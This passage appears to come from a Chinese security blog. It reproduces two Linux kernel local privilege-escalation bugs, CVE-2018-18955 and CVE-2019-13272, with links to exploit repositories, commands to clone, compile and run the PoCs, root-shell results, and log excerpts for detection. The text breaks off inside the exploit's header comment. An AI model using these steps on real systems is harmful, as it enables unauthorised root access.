        <content type="html"><![CDATA[<p>CVE-2018-18955 漏洞涉及到 User 命名空间中的嵌套用户命名空间，用户命名空间中针对 uid（用户ID）和 gid（用户组ID）的 ID 映射机制保证了进程拥有的权限不会逾越其父命名空间的范畴。该漏洞利用创建用户命名空间的子命名空间时损坏的 ID 映射实现提权。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://www.freebuf.com/vuls/197122.html">https://www.freebuf.com/vuls/197122.html</a></p><p><a href="https://www.cnblogs.com/likaiming/p/10816529.html">https://www.cnblogs.com/likaiming/p/10816529.html</a></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Linux kernel 4.15.x through 4.19.x before 4.19.2</p><p>4.19.2 之前的 Linux 内核 4.15.x 到 4.19.x 中</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><a href="https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955">https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955</a></p><p><a href="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2018/CVE-2018-18955">https://github.com/SecWiki/linux-kernel-exploits/tree/master/2018/CVE-2018-18955</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="安装uidmap"><a href="#安装uidmap" class="headerlink" title="安装uidmap"></a>安装uidmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install uidmap</span><br></pre></td></tr></table></figure><h3 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h3><h4 id="exploit-cron-sh-gt-gt-root"><a href="#exploit-cron-sh-gt-gt-root" class="headerlink" title="exploit.cron.sh &gt;&gt; root"></a><code>exploit.cron.sh</code> &gt;&gt; root</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914140313646.png" alt="image-20210914140313646"></p><p>会在cron日志留下记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sep 14 14:01:01 ubuntu cron[890]: (*system*) RELOAD (/etc/crontab)</span><br><span class="line">Sep 14 14:01:01 ubuntu CRON[9424]: (root) CMD (/tmp/payload)</span><br><span class="line">Sep 14 14:02:01 ubuntu cron[890]: (*system*) RELOAD (/etc/crontab)</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914140452397.png" alt="image-20210914140452397"></p><p>auth日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sep 14 14:01:01 ubuntu CRON[9423]: pam_unix(cron:session): session opened for user root by (uid=0)</span><br><span class="line">Sep 14 14:01:01 ubuntu CRON[9423]: pam_unix(cron:session): session closed for user root</span><br></pre></td></tr></table></figure><mark class="hl-label red">警告</mark>  这个只能够提权一次，第二次提权就如下图所示<p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914141540356.png" alt="image-20210914141540356"></p><h4 id="exploit-dbus-sh-gt-gt-root"><a href="#exploit-dbus-sh-gt-gt-root" class="headerlink" title="exploit.dbus.sh    &gt;&gt; root"></a><code>exploit.dbus.sh</code>    &gt;&gt; root</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914150938024.png" alt="image-20210914150938024"></p><h4 id="subuid-shell-gt-gt-nobody"><a href="#subuid-shell-gt-gt-nobody" class="headerlink" title="subuid_shell &gt;&gt;nobody"></a><code>subuid_shell</code> &gt;&gt;nobody</h4><p>提权到<code>nobody</code>权限</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914142013985.png" alt="image-20210914142013985"></p><p>权限为：<code>uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</code></p><p>但是这个<code>nobody</code>好像权限很大。</p><p><a href="https://www.junmajinlong.com/virtual/namespace/user_namespace/">Linux namespace之：user namespace</a></p><h4 id="exploit-ldpreload-sh-gt-gt-root-（优先）"><a href="#exploit-ldpreload-sh-gt-gt-root-（优先）" class="headerlink" title="exploit.ldpreload.sh &gt;&gt; root （优先）"></a><code>exploit.ldpreload.sh</code> &gt;&gt; root （优先）</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914152303505.png" alt="image-20210914152303505"></p><h4 id="exploit-polkit-sh-gt-gt-root-需要-owner的密码"><a href="#exploit-polkit-sh-gt-gt-root-需要-owner的密码" class="headerlink" title="exploit.polkit.sh &gt;&gt; root 需要 owner的密码"></a><code>exploit.polkit.sh</code> &gt;&gt; root 需要 owner的密码</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914152930383.png" alt="image-20210914152930383"></p><p>日志，第一次用test账号密码 是<code>FAILED</code> 第二次owner账号密码<code>successfully</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210914154302979.png" alt="image-20210914154302979"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd</a></p><h2 id="日志特征"><a href="#日志特征" class="headerlink" title="日志特征"></a>日志特征</h2><h3 id="var-log-audit-audit-log"><a href="#var-log-audit-audit-log" class="headerlink" title="/var/log/audit/audit.log"></a><code>/var/log/audit/audit.log</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type=USER_CMD msg=audit(1631519751.428:28): pid=9625 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;cwd=&quot;/var/log/audit&quot; cmd=6170742D67657420696E7374616C6C207569646D6170 terminal=pts/1 res=success&#x27;</span><br><span class="line">type=CRED_REFR msg=audit(1631519751.428:29): pid=9625 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;op=PAM:setcred acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#x27;</span><br><span class="line">type=USER_START msg=audit(1631519751.428:30): pid=9625 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;op=PAM:session_open acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#x27;</span><br><span class="line">type=USER_END msg=audit(1631519756.544:31): pid=9625 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;op=PAM:session_close acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#x27;</span><br><span class="line">type=CRED_DISP msg=audit(1631519756.544:32): pid=9625 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;op=PAM:setcred acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#x27;</span><br><span class="line">type=USER_ACCT msg=audit(1631519821.588:33): pid=10062 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;op=PAM:accounting acct=&quot;root&quot; exe=&quot;/usr/sbin/cron&quot; hostname=? addr=? terminal=cron res=success&#x27;</span><br><span class="line">type=CRED_ACQ msg=audit(1631519821.588:34): pid=10062 uid=0 auid=4294967295 ses=4294967295 msg=&#x27;op=PAM:setcred acct=&quot;root&quot; exe=&quot;/usr/sbin/cron&quot; hostname=? addr=? terminal=cron res=success&#x27;</span><br><span class="line">type=LOGIN msg=audit(1631519821.588:35): pid=10062 uid=0 old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=4 res=1</span><br><span class="line">type=USER_START msg=audit(1631519821.588:36): pid=10062 uid=0 auid=0 ses=4 msg=&#x27;op=PAM:session_open acct=&quot;root&quot; exe=&quot;/usr/sbin/cron&quot; hostname=? addr=? terminal=cron res=success&#x27;</span><br><span class="line">type=CRED_DISP msg=audit(1631519821.604:37): pid=10062 uid=0 auid=0 ses=4 msg=&#x27;op=PAM:setcred acct=&quot;root&quot; exe=&quot;/usr/sbin/cron&quot; hostname=? addr=? terminal=cron res=success&#x27;</span><br><span class="line">type=USER_END msg=audit(1631519821.604:38): pid=10062 uid=0 auid=0 ses=4 msg=&#x27;op=PAM:session_close acct=&quot;root&quot; exe=&quot;/usr/sbin/cron&quot; hostname=? addr=? terminal=cron res=success&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913160252148.png" alt="image-20210913160252148"></p><h3 id="auth-log"><a href="#auth-log" class="headerlink" title="auth.log"></a>auth.log</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sep 13 00:57:01 ubuntu CRON[10062]: pam_unix(cron:session): session opened for user root by (uid=0)</span><br><span class="line">Sep 13 00:57:01 ubuntu CRON[10062]: pam_unix(cron:session): session closed for user root</span><br><span class="line">Sep 13 00:58:51 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)</span><br><span class="line">Sep 13 00:58:51 ubuntu pkexec: pam_systemd(polkit-1:session): Cannot create session: Already running in a session</span><br><span class="line">Sep 13 00:58:51 ubuntu pkexec[10096]: owner: Executing command [USER=root] [TTY=unknown] [CWD=/home/owner] [COMMAND=/usr/lib/update-notifier/package-system-locked]</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913160511356.png" alt="image-20210913160511356"></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-13272</title>
      <link href="/p/2cbd701f.html"/>
      <url>/p/2cbd701f.html</url>
      
        <content type="html"><![CDATA[<p>在5.1.17之前的Linux内核中，kernel / ptrace.c中的ptrace_link错误地处理了想要创建ptrace关系的进程的凭据记录，这允许本地用户通过利用父子的某些方案来获取root访问权限 进程关系，父进程删除权限并调用execve可能允许攻击者控制</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Linux执行PTRACE_TRACEME函数时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数，但是，对象struct cred的生存周期规则不允许无条件的将RCU引用转换为稳定引用。PTRACE_TRACEME获取父进程的凭证，使其能够像父进程一样执行父进程能够执行的各种操作，如果恶意低权限子进程使用PTRACE_TRACEME并且该子进程的父进程具有高权限，子进程可获取其父进程的控制权并且使用其父进程的权限调用execve函数创建一个新的高权限进程。</p><p>注：<strong>该漏洞利用前提:需要目标服务器有桌面环境</strong></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>内核&lt;5.1.17</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// - Ubuntu 16.04.5 kernel 4.15.0-29-generic</span><br><span class="line">// - Ubuntu 18.04.1 kernel 4.15.0-20-generic</span><br><span class="line">// - Ubuntu 18.04.3 kernel 5.0.0-23-generic</span><br><span class="line">// - Ubuntu 19.04 kernel 5.0.0-15-generic</span><br><span class="line">// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic</span><br><span class="line">// - Linux Mint 17.3 kernel 4.4.0-89-generic</span><br><span class="line">// - Linux Mint 18.3 kernel 4.13.0-16-generic</span><br><span class="line">// - Linux Mint 19 kernel 4.15.0-20-generic</span><br><span class="line">// - Xubuntu 16.04.4 kernel 4.13.0-36-generic</span><br><span class="line">// - ElementaryOS 0.4.1 4.8.0-52-generic</span><br><span class="line">// - Backbox 6 kernel 4.18.0-21-generic</span><br><span class="line">// - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64</span><br><span class="line">// - Kali kernel 4.19.0-kali5-amd64</span><br><span class="line">// - MX 18.3 kernel 4.19.37-2~mx17+1</span><br><span class="line">// - RHEL 8.0 kernel 4.18.0-80.el8.x86_64</span><br><span class="line">// - CentOS 8 kernel 4.18.0-80.el8.x86_64</span><br><span class="line">// - Debian 9.4.0 kernel 4.9.0-6-amd64</span><br><span class="line">// - Debian 10.0.0 kernel 4.19.0-5-amd64</span><br><span class="line">// - Devuan 2.0.0 kernel 4.9.0-6-amd64</span><br><span class="line">// - SparkyLinux 5.8 kernel 4.19.0-5-amd64</span><br><span class="line">// - SparkyLinux 5.9 kernel 4.19.0-6-amd64</span><br><span class="line">// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64</span><br><span class="line">// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO</span><br><span class="line">// - Mageia 6 kernel 4.9.35-desktop-1.mga6</span><br><span class="line">// - Antergos 18.7 kernel 4.17.6-1-ARCH</span><br><span class="line">// - lubuntu 19.04 kernel 5.0.0-13-generic</span><br><span class="line">// - Sabayon 19.03 kernel 4.20.0-sabayon</span><br><span class="line">// - Pop! OS 19.04 kernel 5.0.0-21-generic</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a href="http://releases.ubuntu.com/16.04.5/ubuntu-16.04.5-desktop-amd64.iso">系统环境地址</a></p><p>创建一个低权限用户test并设置密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -d /home/test -m test</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure><p>然后切换到test用户,查看系统内核版本是否小于5.1.17,并当前用户和当前用户的UID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">uname -a</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913140209195.png" alt="image-20210913140209195"></p><h3 id="下载poc"><a href="#下载poc" class="headerlink" title="下载poc"></a>下载<a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c">poc</a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bcoles/kernel-exploits.git</span><br></pre></td></tr></table></figure><p>这里会出现如下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &#x27;https://github.com/bcoles/kernel-exploits.git/&#x27;: gnutls_handshake() failed: Error in the pull function.</span><br></pre></td></tr></table></figure><blockquote><p>更新下源就好</p></blockquote><h3 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc poc.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913141422170.png" alt="image-20210913141422170"></p><h3 id="无法成功利用，版本信息"><a href="#无法成功利用，版本信息" class="headerlink" title="无法成功利用，版本信息"></a>无法成功利用，版本信息</h3><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913100719145.png" alt="image-20210913100719145" style="zoom:150%;" /><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913112232590.png" alt="image-20210913112232590"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Uses pkexec technique. Requires execution within the context</span></span><br><span class="line"><span class="comment">// of a user session with an active PolKit agent.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploitation will fail if kernel.yama.ptrace_scope &gt;= 2;</span></span><br><span class="line"><span class="comment">// or SELinux deny_ptrace=on.</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// Original discovery and exploit author: Jann Horn</span></span><br><span class="line"><span class="comment">// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// &lt;bcoles@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// - added known helper paths</span></span><br><span class="line"><span class="comment">// - added search for suitable helpers</span></span><br><span class="line"><span class="comment">// - added automatic targeting</span></span><br><span class="line"><span class="comment">// - changed target suid executable from passwd to pkexec</span></span><br><span class="line"><span class="comment">// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// [user@localhost CVE-2019-13272]$ gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root</span></span><br><span class="line"><span class="comment">// [user@localhost CVE-2019-13272]$ ./ptrace_traceme_root</span></span><br><span class="line"><span class="comment">// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root 